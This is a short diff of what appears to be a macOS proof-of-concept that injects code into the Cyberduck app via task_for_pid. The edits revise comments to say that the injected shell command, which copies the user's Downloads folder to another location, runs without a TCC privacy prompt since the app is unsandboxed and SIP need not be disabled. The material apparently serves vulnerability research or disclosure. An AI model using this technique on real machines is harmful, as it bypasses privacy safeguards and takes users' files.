@@ -18,8 +18,8 @@
 //
 // Result:
 //   execve("/bin/zsh -c 'cp -R ~/Downloads ~/Library/Colors/'") runs
-//   inside Cyberduck's process context, inheriting its TCC Downloads entitlement.
-//   No privacy dialog is shown to the user.
+//   inside Cyberduck's process. Cyberduck is NOT sandboxed (app-sandbox=false),
+//   so injected code inherits full user-level filesystem access — no TCC prompt.
 
 #import <Foundation/Foundation.h>
 #include <mach/mach.h>
@@ -58,7 +58,7 @@ int main(int argc, char *argv[]) {
     kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
     if (kr != KERN_SUCCESS) {
         fprintf(stderr, "[-] task_for_pid failed: %s\n"
-                        "    Are you root? Is SIP disabled? Right PID?\n",
+                        "    Are you root? Correct PID? (SIP does not need to be disabled)\n",
                 mach_error_string(kr));
         return -1;
     }
